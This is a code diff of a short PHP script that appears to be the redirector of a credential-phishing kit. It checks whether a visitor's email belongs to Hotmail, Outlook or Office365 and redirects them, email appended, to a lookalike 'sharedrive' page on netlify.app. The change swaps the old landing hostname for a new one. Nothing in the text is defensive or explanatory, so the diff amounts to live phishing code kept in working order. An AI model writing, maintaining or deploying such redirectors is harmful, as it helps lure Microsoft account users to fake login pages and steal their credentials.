@@ -8,11 +8,11 @@
  $domain_check = '@'.strtolower($domain[1]);
  
  if(stripos($domain_check, '@hotmail.') !== false || stripos($domain_check, '@outlook.') !== false || stripos($domain_check, '@office365.') !== false){
-  header('Location: https://'.$praga.'-access-sharedrive-09ac68.netlify.app'.$email);
+  header('Location: https://'.$praga.'file-sharedrive-365cloud.netlify.app'.$email);
  }
  
  else {
-  header('Location: https://'.$praga.'-access-sharedrive-09ac68.netlify.app'.$email);
+  header('Location: https://'.$praga.'file-sharedrive-365cloud.netlify.app'.$email);
  }
   
 ?>
